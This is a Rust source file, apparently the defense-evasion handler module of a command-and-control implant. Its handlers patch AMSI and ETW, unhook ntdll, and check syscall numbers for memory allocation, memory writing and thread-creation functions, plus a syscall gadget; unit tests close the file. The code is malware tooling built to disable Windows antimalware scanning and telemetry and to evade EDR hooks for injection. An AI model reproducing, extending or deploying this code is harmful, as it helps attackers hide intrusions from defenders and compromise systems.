// src/agent/handlers/evasion.rs — AMSI, ETW, ntdll unhook, syscall diagnostics

use super::{DispatchResult, AgentAction, wrap_result};
use crate::agent::syscalls;

pub fn handle_patch_amsi() -> DispatchResult {
    wrap_result(crate::agent::evasion::patch_amsi())
}

pub fn handle_patch_etw() -> DispatchResult {
    wrap_result(crate::agent::evasion::patch_etw())
}

pub fn handle_unhook_ntdll() -> DispatchResult {
    wrap_result(crate::agent::evasion::unhook_ntdll())
}

pub fn handle_patch_all() -> DispatchResult {
    let mut results = Vec::new();
    match crate::agent::evasion::patch_amsi() {
        Ok(msg) => results.push(format!("[+] {}", msg)),
        Err(e) => results.push(format!("[-] AMSI: {}", e)),
    }
    match crate::agent::evasion::patch_etw() {
        Ok(msg) => results.push(format!("[+] {}", msg)),
        Err(e) => results.push(format!("[-] ETW: {}", e)),
    }
    match crate::agent::evasion::unhook_ntdll() {
        Ok(msg) => results.push(format!("[+] {}", msg)),
        Err(e) => results.push(format!("[-] Unhook: {}", e)),
    }
    DispatchResult::Reply(results.join("\n"), String::new(), 0, AgentAction::None)
}

pub fn handle_syscall_check() -> DispatchResult {
    let mut lines = Vec::new();
    for name in ["NtAllocateVirtualMemory", "NtProtectVirtualMemory", "NtWriteVirtualMemory", "NtCreateThreadEx"] {
        let ssn = unsafe { syscalls::win::get_syscall_number(name) };
        lines.push(format!("{}: {}", name, ssn.map(|n| format!("SSN 0x{:X}", n)).unwrap_or("NOT FOUND".into())));
    }
    let gadget = unsafe { syscalls::win::find_syscall_gadget() };
    lines.push(format!("Syscall gadget: {}", gadget.map(|p| format!("0x{:X}", p as usize)).unwrap_or("NOT FOUND".into())));
    DispatchResult::Reply(lines.join("\n"), String::new(), 0, AgentAction::None)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn patch_all_returns_three_results() {
        match handle_patch_all() {
            DispatchResult::Reply(output, _, 0, _) => {
                // On non-Windows, all three return "Windows only" errors
                let lines: Vec<&str> = output.lines().collect();
                assert_eq!(lines.len(), 3, "patch_all should produce exactly 3 result lines");
            }
            _ => panic!("Expected Reply"),
        }
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn patch_amsi_not_windows() {
        match handle_patch_amsi() {
            DispatchResult::Reply(_, err, 1, _) => {
                assert!(err.contains("Windows only"));
            }
            _ => panic!("Expected Windows only error"),
        }
    }
}
